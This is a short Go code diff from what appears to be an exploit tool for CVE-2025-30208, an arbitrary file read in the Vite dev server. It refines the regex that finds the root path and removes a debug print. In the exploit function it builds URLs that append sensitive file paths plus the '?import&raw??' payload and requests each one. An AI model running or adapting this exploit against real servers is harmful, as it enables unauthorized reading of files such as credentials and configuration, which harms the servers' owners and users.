@@ -10,7 +10,10 @@ import (
 	"path/filepath"
 	"regexp"
 	"strings"
+	"sync"
 )
+
+var wg3 sync.WaitGroup
 
 func (target *Target) check_CVE_2025_30208(sep string) (platform string, isVul bool) {
 	INFO("[*] 检测目标：%s是否存在CVE_2025_30208\n", target.Url)
@@ -20,7 +23,7 @@ func (target *Target) check_CVE_2025_30208(sep string) (platform string, isVul b
 	}
 	defer resp.Body.Close()
 	content, err := io.ReadAll(resp.Body)
-	re := regexp.MustCompile(`<script type="module" src="(.*?)/@vite/client"`)
+	re := regexp.MustCompile(`<script type="module" src="(?:https?:\/\/[^\/]+)?(.*?)/@vite/client"`)
 	matches := re.FindStringSubmatch(string(content))
 	if len(matches) >= 2 {
 		rootPath := matches[1]
@@ -65,7 +68,6 @@ func (target Target) exploit_CVE_2025_30208(sep string) (bool, error) {
 		sensitivePath := scanner.Text()
 		sensitivePath = strings.Replace(sensitivePath, "\\", "/", -1)
 		testValUrl := target.Url + target.RootPath + sep + sensitivePath + "?import&raw??"
-		fmt.Println(testValUrl)
 		response, err := Request(testValUrl)
 		if err != nil {
 			continue
